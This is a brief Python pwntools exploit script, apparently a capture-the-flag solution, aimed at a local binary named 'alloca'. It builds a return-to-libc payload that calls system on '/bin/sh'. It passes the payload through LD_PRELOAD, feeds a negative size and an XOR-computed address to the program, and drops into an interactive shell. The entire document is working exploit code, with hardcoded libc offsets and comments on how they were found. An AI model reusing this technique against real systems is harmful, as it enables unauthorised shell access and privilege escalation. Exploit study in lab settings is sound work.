from pwn import *
import os

# ulimit -s unlimited
# export LD_PRELOAD=$(python -c print "\xb0\xa0\x5c\x55deadbeef\x40\xbc\x6e\x55")

off_system  = 0x0003f0b0    # objdump -d /lib/i386-linux-gnu/libc.so.6 | grep system
off_shell   = 0x00160c40    # grep -oba /bin/sh /lib/i386-linux-gnu/libc.so.6
adr_libc    = 0x5558b000    # ldd alloca
adr_payload = 0x5557b857    # info proc mappings ; find 0x5557a000,+0x2000,"\x41\x41\x41\x41"

payload     =   p32(adr_libc + off_system)
payload     +=  p32(0xdeadbeef)
payload     +=  p32(adr_libc + off_shell)

os.system('ulimit -s unlimited')
p = process('/home/alloca/alloca', env = {'LD_PRELOAD': payload})
p.sendline(str(-92))                       # -83 ~ -98 is ok
p.sendline(str((adr_payload + 4) ^ 0x5572fff4))      # 0x5572fff4 is read from stack
p.interactive()
